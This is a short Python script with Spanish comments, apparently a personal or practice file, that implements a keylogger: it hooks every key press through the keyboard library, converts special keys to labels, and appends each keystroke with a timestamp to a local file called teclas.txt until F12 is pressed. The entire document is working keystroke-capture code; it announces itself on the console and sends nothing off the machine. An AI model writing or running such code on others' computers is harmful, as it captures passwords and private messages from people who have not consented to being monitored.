# -*- coding: utf-8 -*-
"""
Created on Fri Sep 19 20:58:59 2025

@author: nikol
"""

import keyboard
import datetime

# Función que se ejecuta con cada tecla
def tecla_presionada(event):
    tecla = event.name
    
    # Convertir teclas especiales
    if tecla == "space":
        tecla = " "
    elif tecla == "enter":
        tecla = "\n"
    elif tecla == "backspace":
        tecla = "[BORRAR]"
    elif len(tecla) > 1:
        tecla = f"[{tecla.upper()}]"
    
    # Guardar en el archivo .txt
    with open("teclas.txt", "a", encoding="utf-8") as archivo:
        hora_actual = datetime.datetime.now().strftime("%H:%M:%S")
        archivo.write(f"{hora_actual}: {tecla}\n")

# Configurar el detector de teclas
keyboard.on_press(tecla_presionada)

print("Keylogger iniciado. Presiona F12 para detener")
print("Las teclas se guardan en: teclas.txt")

# Esperar hasta que presiones F12
keyboard.wait('f12')
print("Keylogger detenido")